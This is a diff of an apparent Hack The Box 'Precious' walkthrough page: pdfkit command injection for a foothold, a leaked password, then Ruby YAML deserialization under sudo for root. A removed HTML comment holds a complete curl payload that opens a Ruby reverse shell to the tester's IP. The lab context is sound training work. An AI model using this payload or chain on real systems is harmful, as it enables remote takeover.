@@ -67,104 +67,160 @@
           
                 <h2 class="header-secondary-walkthrough">Step 1: Start off with an Nmap Scan</h2>       
                
-             
-                <p class="walkthrough-copy"><button class="copy-btn" onclick="copyToClipboard(this)"><i class="fa-solid fa-copy"></i></button><code>nmap -sV -sC &lt;IP ADDRESS&gt; -oA &lt;FILE NAME&gt;</code></p>
-              
-
-<img class="walkthrough-img" src="./img/Picture1.png" alt="Nmap scan">
-
-
-
-<p class="description">Add in precious to the /etc/hosts file. This is a very common thing for Hack The Box and it will save you on some headaches later on.</p>
-<img class="walkthrough-img" src="./img/Picture2.png" alt="/etc/hosts">
-
-<p class="description">We can see that port 80 is open which likely means there is a website.</p>
-
-<p class="description">When a CTF challenge has a website, I immediately think “gobuster and burp suite”. Gobuster is a great tool to enumerate a website. It allows us to scan for potential directories, such as www.&lt;WEBSITE&gt;.com/dev as well as vhosts on the host such as dev.&lt;WEBSITE&gt;.com</p>
-
-<p class="description">This will scan for any directories that come after the main website: </p>
-    <p class="walkthrough-copy"><button class="copy-btn" onclick="copyToClipboard(this)"><i class="fa-solid fa-copy"></i></button><code>gobuster dir -u http://precious.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code></p>
-
-   
-<img class="walkthrough-img" src="./img/Picture3.png" alt="gobuster">
-
-<p class="description">This one will scan for any vhosts: </p>
-    <p class="walkthrough-copy"><button class="copy-btn" onclick="copyToClipboard(this)"><i class="fa-solid fa-copy"></i></button><code>gobuster vhost -u http://precious.htb/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt –append-domain</code></p>
-    <p class="description">Unfortunately, both gobuster scans found nothing. We still know very little about this box. http://precious.htb takes us to this page. It is very empty, all we are able to do is convert a webpage to pdf on their website.</p>
-   
-<img class="walkthrough-img" src="./img/Picture4.png" alt="gobuster">
-
-<p class="description">We can capture the request on burp suite.</p>
-<img class="walkthrough-img" src="./img/Picture5.png" alt="precious webpage">
-
-<p class="description">Nothing for a remote host But we can try from our own machine. Set up a quick server to test:  </p>
-    <p class="walkthrough-copy"><button class="copy-btn" onclick="copyToClipboard(this)"><i class="fa-solid fa-copy"></i></button><code>python3 -m http.server</code></p>
-   
-<img class="walkthrough-img" src="./img/Picture6.png" alt="burp suite">
-<img class="walkthrough-img" src="./img/Picture7.png" alt="python server">
-
-<p class="description">Looks like we can get some more information out of this.</p>
-<img class="walkthrough-img" src="./img/Picture8.png" alt="burp suite">
-
-<p class="description">Htmltopdf 0.12.6 , ruby, rubies are precious, get it?</p>
-<img class="walkthrough-img" src="./img/Picture9.png" alt="burp suite">
-
-<p class="description">Google searching about ruby pdf kits leads us to this github link: 
-    <p class="walkthrough-copy"><button class="copy-btn" onclick="copyToClipboard(this)"><i class="fa-solid fa-copy"></i></button><a href="https://github.com/CyberArchitect1/CVE-2022-25765-pdfkit-Exploit-Reverse-Shell">https://github.com/CyberArchitect1/CVE-2022-25765-pdfkit-Exploit-Reverse-Shell</a></p>
-    </p>
-<img class="walkthrough-img" src="./img/Picture10.png" alt="">
-
-<p class="description">Used notepad++ to edit the script to add in the values indicated.</p>
-<img class="walkthrough-img" src="./img/Picture11.png" alt="notepad ++ replace feature">
-
-<!-- <p class="description">The completed, edited script is: </p> -->
-<!-- <p class="description" id="small-text">    curl 'precious.htb' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,/;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://precious.htb' -H 'Connection: keep-alive' -H 'Referer: http://precious.htb' -H 'Upgrade-Insecure-Requests: 1' --data-raw 'url=http%3A%2F%2F10.10.14.51%3A8000%2F%3Fname%3D%2520%60+ruby+-rsocket+-e%27spawn%28%22sh%22%2C%5B%3Ain%2C%3Aout%2C%3Aerr%5D%3D%3ETCPSocket.new%28%2210.10.14.51%22%2C1234%29%29%27%60'</p> -->
-</p>
-<p class="description">You need to edit it so that your IP and the machines IP/webpage are in the proper place. You also need to sanitize it by replacing all spaces with %20 This is a safety measure taken so that people can not inject bad code into that section. For example, certain characters like “, &gt;, [} can break certain programming languages if they are interpreted. This is very commonly referred to as an injection and by sanitizing malicious characters, you reduce the risk that a malicious actor will input one of these characters to escape normal program functionality and instead execute their own commands or insert data into unexpected places.</p>
-
-<p class="description">For this script to execute you will need three parts:</p>
-<p class="description">1. We will need to have our netcat listener read</p>
-<p class="description">2. We will need our own http server</p>
-<p class="description">3. We need to curl the request to the server</p>
-
-<p class="description">Once this is done, we should have access.</p>
-<img class="walkthrough-img" src="./img/Picture12.png" alt="curl">
-<img class="walkthrough-img" src="./img/Picture13.png" alt="curl">
-<img class="walkthrough-img" src="./img/Picture14.png" alt="netcat listener">
-
-<p class="description">We are in, but not as user quite yet. We can try using linpeas to start some enumeration going on the machine.</p>
-<img class="walkthrough-img" src="./img/Picture15.png" alt="curl linpeas">
-<img class="walkthrough-img" src="./img/Picture16.png" alt="">
-<img class="walkthrough-img" src="./img/Picture17.png" alt="">
-<img class="walkthrough-img" src="./img/Picture18.png" alt="running linpeas">
-<img class="walkthrough-img" src="./img/Picture19.png" alt="linpeas results">
-
-<p class="description">Not much from linPEAS that screams low hanging fruit, so let’s do some manual enumeration for now.</p>
-
-<p class="description">Doing ls -al shows us an interesting hidden folder called .bundle Inside there we find a config file which gives us a user password!</p>
-<img class="walkthrough-img" src="./img/Picture20.png" alt="">
-
-<p class="description">we can use su henry and our new password to get in as user and grab our user flag.</p>
-<img class="walkthrough-img" src="./img/Picture21.png" alt="">
-
-<p class="description">We can run ruby as root, but only the update dependencies.rb file. If it was just ruby, we’d be root by now!</p>
-<img class="walkthrough-img" src="./img/Picture22.png" alt="">
-
-<p class="description">We can read the update_dependencies.rb file and there’s something very interesting about it.</p>
-<img class="walkthrough-img" src="./img/Picture23.png" alt="">
-
-<p class="description">We can see it’s reading the file “dependencies.yml” but it does not specify an absolute path, this means as long as we’re able to create a file as henry somewhere on this computer, we can run sudo /usr/bin/ruby /opt/update_dependencies.rb and it will read our dependencies.yml file of our current directory. Going to google for “ruby yaml exploit” and we find the first link with some useful information. We’re able to create a .yml file based off this webpage. You can edit the file to run commands you want, just put it in the git_set: “COMMAND HERE” https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/</p>
-
-<p class="description">I decided to try reading the root flag to see if this works.</p>
-<img class="walkthrough-img" src="./img/Picture24.png" alt="">
-
-<p class="description">Then running our sudo command we can get command execution and we can cat the root flag.</p>
-<img class="walkthrough-img" src="./img/Picture25.png" alt="root flag">
-
-<p class="description">Success! Precious has been pwned 😎</p>
-<img class="walkthrough-img" src="./img/Picture26.png" alt="Precious has been pwned artwork">
-
-      
+                <p class="walkthrough-copy">
+                    <button class="copy-btn" onclick="copyToClipboard(this)">
+                      <i class="fa-solid fa-copy"></i>
+                    </button>
+                    <code>nmap -sV -sC &lt;IP ADDRESS&gt; -oA &lt;FILE NAME&gt;</code>
+                  </p>
+                  
+                  <img class="walkthrough-img" src="./img/Picture1.png" alt="Nmap scan">
+                  
+                  <p class="description">
+                    Add "precious" to the <code>/etc/hosts</code> file. This is very common in Hack The Box and will save you some headaches later on.
+                  </p>
+                  <img class="walkthrough-img" src="./img/Picture2.png" alt="/etc/hosts">
+                  
+                  <p class="description">
+                    We can see that port 80 is open, which likely means there's a website.
+                  </p>
+                  
+                  <p class="description">
+                    When a CTF challenge has a website, I immediately think “Gobuster and Burp Suite.” Gobuster is a great tool for enumerating websites. It allows us to scan for potential directories like <code>www.&lt;WEBSITE&gt;.com/dev</code>, as well as virtual hosts such as <code>dev.&lt;WEBSITE&gt;.com</code>.
+                  </p>
+                  
+                  <p class="description">This will scan for any directories after the main website:</p>
+                  <p class="walkthrough-copy">
+                    <button class="copy-btn" onclick="copyToClipboard(this)">
+                      <i class="fa-solid fa-copy"></i>
+                    </button>
+                    <code>gobuster dir -u http://precious.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code>
+                  </p>
+                  
+                  <img class="walkthrough-img" src="./img/Picture3.png" alt="gobuster">
+                  
+                  <p class="description">This one will scan for any virtual hosts:</p>
+                  <p class="walkthrough-copy">
+                    <button class="copy-btn" onclick="copyToClipboard(this)">
+                      <i class="fa-solid fa-copy"></i>
+                    </button>
+                    <code>gobuster vhost -u http://precious.htb/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain</code>
+                  </p>
+                  
+                  <p class="description">
+                    Unfortunately, both Gobuster scans found nothing. We still know very little about this box. Visiting <code>http://precious.htb</code> takes us to a page that’s very empty — the only thing we can do is convert a webpage to a PDF.
+                  </p>
+                  
+                  <img class="walkthrough-img" src="./img/Picture4.png" alt="gobuster results">
+                  
+                  <p class="description">We can capture the request using Burp Suite.</p>
+                  <img class="walkthrough-img" src="./img/Picture5.png" alt="precious webpage">
+                  
+                  <p class="description">Nothing happens when using a remote host, but we can try from our own machine. Set up a quick server to test:</p>
+                  <p class="walkthrough-copy">
+                    <button class="copy-btn" onclick="copyToClipboard(this)">
+                      <i class="fa-solid fa-copy"></i>
+                    </button>
+                    <code>python3 -m http.server</code>
+                  </p>
+                  
+                  <img class="walkthrough-img" src="./img/Picture6.png" alt="burp suite">
+                  <img class="walkthrough-img" src="./img/Picture7.png" alt="python server">
+                  
+                  <p class="description">Looks like we can get some more information from this.</p>
+                  <img class="walkthrough-img" src="./img/Picture8.png" alt="burp suite">
+                  
+                  <p class="description">
+                    Htmltopdf 0.12.6, Ruby... rubies are precious — get it?
+                  </p>
+                  <img class="walkthrough-img" src="./img/Picture9.png" alt="burp suite">
+                  
+                  <p class="description">
+                    Googling around for "Ruby PDF kits" leads us to this GitHub link:
+                  </p>
+                  <p class="walkthrough-copy">
+                    <button class="copy-btn" onclick="copyToClipboard(this)">
+                      <i class="fa-solid fa-copy"></i>
+                    </button>
+                    <a href="https://github.com/CyberArchitect1/CVE-2022-25765-pdfkit-Exploit-Reverse-Shell">
+                      https://github.com/CyberArchitect1/CVE-2022-25765-pdfkit-Exploit-Reverse-Shell
+                    </a>
+                  </p>
+                  
+                  <img class="walkthrough-img" src="./img/Picture10.png" alt="github CVE page">
+                  
+                  <p class="description">I used Notepad++ to edit the script and plug in the required values.</p>
+                  <img class="walkthrough-img" src="./img/Picture11.png" alt="Notepad++ replace feature">
+                  
+                  <p class="description">
+                    You'll need to edit the script with your IP and the machine's IP/webpage in the appropriate places. Be sure to sanitize it by replacing all spaces with <code>%20</code>. This prevents injection attacks, where malicious characters (like <code>"</code>, <code>&gt;</code>, or <code>}</code>) could break or hijack the command.
+                  </p>
+                  
+                  <p class="description">For this script to work, you'll need three things:</p>
+                  <ol class="description">
+                    <li>A netcat listener</li>
+                    <li>Your own HTTP server</li>
+                    <li>A curl command to trigger the exploit</li>
+                  </ol>
+                  
+                  <p class="description">Once that's all set up, we should have access.</p>
+                  <img class="walkthrough-img" src="./img/Picture12.png" alt="curl command output">
+                  <img class="walkthrough-img" src="./img/Picture13.png" alt="curl successful">
+                  <img class="walkthrough-img" src="./img/Picture14.png" alt="netcat listener">
+                  
+                  <p class="description">
+                    We're in — but not as user just yet. Let's use LinPEAS to start some enumeration on the machine.
+                  </p>
+                  <img class="walkthrough-img" src="./img/Picture15.png" alt="curl linpeas">
+                  <img class="walkthrough-img" src="./img/Picture16.png" alt="">
+                  <img class="walkthrough-img" src="./img/Picture17.png" alt="">
+                  <img class="walkthrough-img" src="./img/Picture18.png" alt="running linpeas">
+                  <img class="walkthrough-img" src="./img/Picture19.png" alt="linpeas results">
+                  
+                  <p class="description">
+                    Not much from LinPEAS that screams low-hanging fruit, so let’s do some manual enumeration.
+                  </p>
+                  
+                  <p class="description">
+                    Running <code>ls -al</code> reveals a hidden folder called <code>.bundle</code>. Inside, there's a config file with a user password!
+                  </p>
+                  <img class="walkthrough-img" src="./img/Picture20.png" alt="found password">
+                  
+                  <p class="description">
+                    We can use <code>su henry</code> and our new password to log in as the user and grab the user flag.
+                  </p>
+                  <img class="walkthrough-img" src="./img/Picture21.png" alt="user flag">
+                  
+                  <p class="description">
+                    We can run Ruby as root, but only on the <code>update_dependencies.rb</code> file. If it was just Ruby, we’d already be root!
+                  </p>
+                  <img class="walkthrough-img" src="./img/Picture22.png" alt="sudo ruby permission">
+                  
+                  <p class="description">
+                    Reading the <code>update_dependencies.rb</code> file reveals something interesting...
+                  </p>
+                  <img class="walkthrough-img" src="./img/Picture23.png" alt="reading update_dependencies.rb">
+                  
+                  <p class="description">
+                    The script reads from a file named <code>dependencies.yml</code> without an absolute path, meaning if we can create a file by that name in our current directory, it’ll get used. Googling “ruby yaml exploit” led me to this blog post:
+                    <a href="https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/">
+                      Stratum Security - YAML Deserialization RCE
+                    </a>
+                  </p>
+                  
+                  <p class="description">
+                    I edited a <code>.yml</code> file to include a command to read the root flag.
+                  </p>
+                  <img class="walkthrough-img" src="./img/Picture24.png" alt="yaml exploit">
+                  
+                  <p class="description">
+                    Then, running our sudo command, we got command execution and read the root flag!
+                  </p>
+                  <img class="walkthrough-img" src="./img/Picture25.png" alt="root flag success">
+                  
+                  <p class="description">Success! Precious has been pwned 😎</p>
+                  <img class="walkthrough-img" src="./img/Picture26.png" alt="Precious has been pwned artwork">
+                  
     
             </div>
   
